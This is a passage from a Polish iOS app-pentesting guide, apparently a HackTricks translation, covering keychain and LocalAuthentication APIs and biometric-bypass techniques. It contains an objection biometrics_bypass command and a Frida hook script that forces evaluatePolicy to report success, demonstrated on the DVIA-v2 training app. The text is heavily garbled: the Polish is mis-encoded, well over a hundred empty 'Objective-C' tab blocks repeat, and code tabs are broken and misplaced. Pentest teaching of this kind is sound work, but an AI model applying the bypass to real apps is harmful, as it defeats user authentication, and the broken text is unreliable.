GÅ‚Ã³wne sprawdzenia, ktÃ³re naleÅ¼y przeprowadziÄ‡, to znalezienie **wpisanych w kodzie** haseÅ‚/tajemnic lub sprawdzenie, czy sÄ… one **przewidywalne**, oraz sprawdzenie, czy kod uÅ¼ywa jakiegoÅ› rodzaju **sÅ‚abych** **algorytmÃ³w kryptograficznych**.

Warto wiedzieÄ‡, Å¼e moÅ¼na **monitorowaÄ‡** niektÃ³re **biblioteki kryptograficzne** automatycznie za pomocÄ… narzÄ™dzia **objection** przy uÅ¼yciu:
```swift
ios monitor crypt
```
Dla **wiÄ™cej informacji** na temat interfejsÃ³w API i bibliotek kryptograficznych iOS odwiedÅº [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Lokalna autoryzacja

**Lokalna autoryzacja** odgrywa kluczowÄ… rolÄ™, zwÅ‚aszcza jeÅ›li chodzi o zabezpieczanie dostÄ™pu do zdalnego punktu koÅ„cowego za pomocÄ… metod kryptograficznych. IstotÄ… jest, Å¼e bez odpowiedniej implementacji mechanizmy lokalnej autoryzacji mogÄ… zostaÄ‡ obejÅ›cia.

**[Framework Local Authentication](https://developer.apple.com/documentation/localauthentication)** firmy Apple oraz **[keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)** zapewniajÄ… programistom solidne interfejsy API do uÅ‚atwiania dialogÃ³w autoryzacyjnych uÅ¼ytkownika i bezpiecznego obsÅ‚ugiwania poufnych danych. Bezpieczne schowki zabezpieczajÄ… odciski palcÃ³w dla Touch ID, podczas gdy Face ID polega na rozpoznawaniu twarzy bez naraÅ¼ania danych biometrycznych.

Aby zintegrowaÄ‡ Touch ID/Face ID, programiÅ›ci majÄ… do wyboru dwie opcje API:
- **`LocalAuthentication.framework`** dla autoryzacji uÅ¼ytkownika na wysokim poziomie bez dostÄ™pu do danych biometrycznych.
- **`Security.framework`** dla dostÄ™pu do usÅ‚ug schowka na niÅ¼szym poziomie, zabezpieczajÄ…cego poufne dane za pomocÄ… autoryzacji biometrycznej. RÃ³Å¼ne [oparte na kodzie ÅºrÃ³dÅ‚owym nakÅ‚adki](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) uÅ‚atwiajÄ… dostÄ™p do schowka.

{% hint style="danger" %}
Jednak zarÃ³wno `LocalAuthentication.framework`, jak i `Security.framework` majÄ… podatnoÅ›ci, poniewaÅ¼ zwracajÄ… przede wszystkim wartoÅ›ci logiczne bez przesyÅ‚ania danych do procesÃ³w autoryzacyjnych, co czyni je podatnymi na obejÅ›cie (patrz [Don't touch me that way, autorstwa Davida Lindnera i innych](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Implementacja lokalnej autoryzacji

Aby poprosiÄ‡ uÅ¼ytkownikÃ³w o autoryzacjÄ™, programiÅ›ci powinni uÅ¼ywaÄ‡ metody **`evaluatePolicy`** w klasie **`LAContext`**, wybierajÄ…c spoÅ›rÃ³d:
- **`deviceOwnerAuthentication`**: Wymaga uÅ¼ycia Touch ID lub kodu dostÄ™pu do urzÄ…dzenia, nie powiedzie siÄ™, jeÅ›li Å¼adne z nich nie jest wÅ‚Ä…czone.
- **`deviceOwnerAuthenticationWithBiometrics`**: WyÅ‚Ä…cznie wymaga uÅ¼ycia Touch ID.

PomyÅ›lna autoryzacja jest wskazywana przez wartoÅ›Ä‡ logicznÄ… zwracanÄ… przez **`evaluatePolicy`**, co moÅ¼e wskazywaÄ‡ na potencjalnÄ… lukÄ™ w zabezpieczeniach.

### Lokalna autoryzacja za pomocÄ… schowka

Implementacja **lokalnej autoryzacji** w aplikacjach iOS polega na uÅ¼yciu **API schowka** do bezpiecznego przechowywania poufnych danych, takich jak tokeny autoryzacyjne. Ten proces zapewnia, Å¼e dane mogÄ… byÄ‡ dostÄ™pne tylko przez uÅ¼ytkownika, korzystajÄ…c z kodu dostÄ™pu do urzÄ…dzenia lub autoryzacji biometrycznej, takiej jak Touch ID.

Schowek oferuje moÅ¼liwoÅ›Ä‡ ustawienia elementÃ³w z atrybutem `SecAccessControl`, ktÃ³ry ogranicza dostÄ™p do elementu do momentu, gdy uÅ¼ytkownik pomyÅ›lnie autoryzuje siÄ™ za pomocÄ… Touch ID lub kodu dostÄ™pu do urzÄ…dzenia. Ta funkcja jest kluczowa dla poprawy bezpieczeÅ„stwa.

PoniÅ¼ej znajdujÄ… siÄ™ przykÅ‚ady kodu w jÄ™zyku Swift i Objective-C, ktÃ³re pokazujÄ…, jak zapisaÄ‡ i odczytaÄ‡ ciÄ…g znakÃ³w do/z schowka, wykorzystujÄ…c te funkcje zabezpieczeÅ„. PrzykÅ‚ady pokazujÄ… specyficzne konfiguracje kontroli dostÄ™pu, ktÃ³re wymagajÄ… autoryzacji Touch ID i zapewniajÄ…, Å¼e dane sÄ… dostÄ™pne tylko na urzÄ…dzeniu, na ktÃ³rym zostaÅ‚y skonfigurowane, pod warunkiem, Å¼e skonfigurowano kod dostÄ™pu do urzÄ…dzenia.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}Objective-C{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{% tab title="Objective-C" %}
Objective-C
{% endtab %}

{%
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Swift" %}

Teraz moÅ¼emy zaÅ¼Ä…daÄ‡ zapisanego elementu z keychaina. UsÅ‚ugi keychaina wyÅ›wietlÄ… okno dialogowe uwierzytelniania uÅ¼ytkownika i zwrÃ³cÄ… dane lub nil, w zaleÅ¼noÅ›ci od tego, czy podano odpowiedni odcisk palca czy nie.

```swift
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrService as String: "MyApp",
    kSecAttrAccount as String: "username",
    kSecReturnData as String: true
]

var item: CFTypeRef?
let status = SecItemCopyMatching(query as CFDictionary, &item)

if status == errSecSuccess {
    let passwordData = item as! Data
    let password = String(data: passwordData, encoding: .utf8)
    print("Password: \(password ?? "")")
} else {
    print("Error retrieving password: \(status)")
}
```

{% endtab %}
{% endtabs %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Wykrywanie

UÅ¼ycie frameworkÃ³w w aplikacji moÅ¼na rÃ³wnieÅ¼ wykryÄ‡, analizujÄ…c listÄ™ wspÃ³Å‚dzielonych dynamicznych bibliotek w pliku binarnym aplikacji. MoÅ¼na to zrobiÄ‡ za pomocÄ… polecenia `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
JeÅ›li w aplikacji jest uÅ¼ywany `LocalAuthentication.framework`, wynik bÄ™dzie zawieraÅ‚ obie z poniÅ¼szych linii (pamiÄ™taj, Å¼e `LocalAuthentication.framework` korzysta z `Security.framework` pod spodem):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
JeÅ›li uÅ¼ywany jest `Security.framework`, zostanie pokazana tylko druga opcja.

### OminiÄ™cie ramki Local Authentication

#### **Objection**

Przez **Objection Biometrics Bypass**, dostÄ™pny na [tej stronie GitHub](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), istnieje technika ominiÄ™cia mechanizmu **LocalAuthentication**. Istota tego podejÅ›cia polega na wykorzystaniu **Frida** do manipulowania funkcjÄ… `evaluatePolicy`, zapewniajÄ…c, Å¼e zawsze zwraca ona wartoÅ›Ä‡ `True`, niezaleÅ¼nie od rzeczywistego sukcesu uwierzytelniania. Jest to szczegÃ³lnie przydatne do obejÅ›cia wadliwych procesÃ³w uwierzytelniania biometrycznego.

Aby aktywowaÄ‡ to ominiÄ™cie, uÅ¼ywa siÄ™ nastÄ™pujÄ…cej komendy:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
To polecenie uruchamia sekwencjÄ™, w ktÃ³rej Objection rejestruje zadanie, ktÃ³re efektywnie zmienia wynik sprawdzania `evaluatePolicy` na `True`.

#### Frida

PrzykÅ‚ad uÅ¼ycia **`evaluatePolicy`** z aplikacji [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Aby osiÄ…gnÄ…Ä‡ **ominiÄ™cie** lokalnej autoryzacji, napisany jest skrypt Frida. Ten skrypt jest ukierunkowany na sprawdzenie metody **evaluatePolicy**, przechwytujÄ…c jej wywoÅ‚anie zwrotne, aby upewniÄ‡ siÄ™, Å¼e zawsze zwraca **success=1**. Poprzez zmianÄ™ zachowania wywoÅ‚ania zwrotnego, sprawdzanie autoryzacji jest efektywnie ominiÄ™te.

PoniÅ¼szy skrypt jest wstrzykiwany, aby zmodyfikowaÄ‡ wynik metody **evaluatePolicy**. Zmienia on wynik wywoÅ‚ania zwrotnego, aby zawsze wskazywaÅ‚ na sukces.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Aby wstrzyknÄ…Ä‡ skrypt Frida i ominÄ…Ä‡ uwierzytelnianie biometryczne, uÅ¼ywane jest polecenie:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Ujawnienie wraÅ¼liwej funkcjonalnoÅ›ci poprzez IPC

### Niestandardowe obsÅ‚ugiwane URI / Deep Linki / Niestandardowe schematy

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Uniwersalne linki

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity Sharing

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Rozszerzenia aplikacji

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializacja i kodowanie

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Komunikacja sieciowa

WaÅ¼ne jest sprawdzenie, czy nie wystÄ™puje **komunikacja bez szyfrowania**, a takÅ¼e czy aplikacja poprawnie **sprawdza certyfikat TLS** serwera.\
Aby sprawdziÄ‡ tego rodzaju problemy, moÅ¼na uÅ¼yÄ‡ proxy takiego jak **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Sprawdzanie nazwy hosta

